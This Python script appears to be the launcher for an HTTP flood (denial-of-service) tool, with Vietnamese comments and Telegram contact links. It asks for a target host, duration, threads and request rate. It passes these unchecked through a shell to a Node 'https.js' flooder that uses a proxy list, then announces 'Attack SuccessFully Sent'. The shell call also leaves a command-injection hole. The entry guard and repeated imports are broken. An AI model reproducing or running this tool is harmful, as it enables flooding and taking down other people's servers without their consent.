import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
                              ,MMM8&&&.
                         ...MMMMM88&&&&...
                      .::```MMMMM88&&&&&&```::.
                     ::     MMMMM88&&&&&&     ::
                     '::....MMMMM88&&&&&&....::'
                        ````'MMMMM88&&&&```'`
                              'MMM8&&&'
                            [███████████]           
 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(target, time, request, thread):
    command = f'node https.js GET {time} {thread} proxy.txt {request} {target}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    time = input("\033[1;37mTime : \033[1;33m")
    thread = input("\033[1;37mThreads : \033[1;33m")
    request = input("\033[1;37mRates : \033[1;33m")
    target = input("\033[1;37mHost : \033[1;33m")
    print("\n\033[1;37mAttack SuccessFully Sent To \033[1;31mServer \033[1;37m!!!\n\033[1;33mAdmin : \033[1;37mt.me/haibe206\n\033[1;33mChanel : \033[1;37mt.me/cyberviet")
    execute_command(target, time, request, thread)

# Gọi hàm main để chạy công cụ
if name == "main":
    main()